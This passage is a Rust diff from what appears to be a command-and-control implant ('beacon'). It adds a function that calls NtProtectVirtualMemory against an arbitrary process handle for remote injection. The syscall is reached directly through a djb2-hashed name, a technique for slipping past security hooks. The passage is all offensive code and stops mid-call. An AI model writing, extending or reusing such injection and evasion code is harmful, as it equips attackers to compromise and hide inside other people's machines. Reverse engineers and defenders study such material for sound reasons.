@@ -1050,10 +1050,27 @@ pub unsafe fn nt_protect_virtual_memory(
     new_prot: u32,
     old_prot: &mut u32,
 ) -> Option<i32> {
+    nt_protect_virtual_memory_process(rt, 0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old_prot)
+}
+
+/// `NtProtectVirtualMemory` against an arbitrary process handle (remote
+/// inject paths). Same 5-arg contract as [`nt_protect_virtual_memory`].
+///
+/// # Safety
+/// `process_handle` must grant `PROCESS_VM_OPERATION`; `base`/`size`/`old_prot`
+/// must be valid mutable refs. Single-threaded beacon context.
+pub unsafe fn nt_protect_virtual_memory_process(
+    rt: &Runtime,
+    process_handle: usize,
+    base: &mut usize,
+    size: &mut usize,
+    new_prot: u32,
+    old_prot: &mut u32,
+) -> Option<i32> {
     syscall5(
         rt,
         djb2(b"ntprotectvirtualmemory"),
-        0xFFFF_FFFF_FFFF_FFFF, // NtCurrentProcess pseudo-handle
+        process_handle,
         base as *mut usize as usize,
         size as *mut usize as usize,
         new_prot as usize,
